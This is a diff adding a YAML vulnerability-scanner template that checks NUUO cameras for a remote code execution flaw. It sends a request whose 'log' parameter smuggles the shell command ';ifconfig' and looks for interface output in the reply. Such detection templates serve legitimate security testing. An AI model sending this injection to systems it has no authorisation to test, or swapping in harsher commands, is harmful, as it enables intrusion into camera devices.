@@ -1,0 +1,22 @@
+id: poc-yaml-nuuo-camera-log-rce
+info:
+  name: NUUO Camera Log Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/__debugging_center_utils___.php?log=;ifconfig"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Debugging Center"
+          - "ifconfig"
+          - "eth0"
+          - "Link encap"
